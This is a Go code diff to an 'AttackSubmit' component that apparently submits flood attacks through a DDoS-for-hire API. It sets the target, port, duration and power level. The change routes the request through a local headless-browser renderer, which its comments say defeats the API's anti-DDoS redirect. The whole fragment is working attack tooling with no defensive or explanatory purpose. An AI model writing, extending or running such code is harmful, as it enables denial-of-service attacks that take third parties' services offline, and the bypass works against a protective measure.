@@ -114,8 +114,8 @@ func (self *AttackSubmit) Process(payload string) {
     } 
     // self.lock.Unlock()    
     //attack submit
-    url, _ :=  url.ParseRequestURI(api.Api)
-    query := url.Query()
+    u, _ :=  url.ParseRequestURI(api.Api)
+    query := u.Query()
     // ips, err := net.LookupIP(attack.Url)
     // if  err == nil {
     //     attack.Host = ips[0].String()
@@ -133,11 +133,18 @@ func (self *AttackSubmit) Process(payload string) {
     query.Add("time", fmt.Sprintf("%d", attack.Time))
     query.Add("port", attack.Port)
     query.Add("powerlevel", fmt.Sprintf("%d", attack.Powerlevel))
-    url.RawQuery = query.Encode()
+    u.RawQuery = query.Encode()
     
-    self.cfg.Log.Println(url.String()) 
+    self.cfg.Log.Println(u.String()) 
     self.cfg.Log.Println("attack request start...")
-    response, err := util.HttpGet(url.String())
+    // response, err := util.HttpGet(u.String())
+    //目标api为了防止ddos采用了302跳转然后自动刷新到目标api的方法
+    //采用headless浏览器渲染目标api
+    postValues := url.Values{}
+    postValues.Add("url", u.String())
+    postValues.Add("renderTime", "30")
+    response, err := util.HttpPost("http://localhost:10010/doload", postValues)
+    
     self.cfg.Log.Println("attack request end...")
     defer func() {
         if response != nil {
@@ -145,13 +152,13 @@ func (self *AttackSubmit) Process(payload string) {
         }
     }()
     if err != nil || response == nil {
-        self.cfg.Log.Printf("request fails {%s}", url.String())
+        self.cfg.Log.Printf("request fails {%s}", u.String())
         return        
     }
     self.cfg.Log.Println("attack response read start...")    
     doc, _ := goquery.NewDocumentFromResponse(response)
     
-    self.cfg.Log.Printf("{%s} {%s}", url.String(), doc.Text())
+    self.cfg.Log.Printf("{%s} {%s}", u.String(), doc.Text())
     self.cfg.Log.Println("attack response read end...")
     // sqlStr = `update spider_flood_api set time = ?, powerlevel = ? , uptime = unix_timestamp() + ? where id = ?`
     
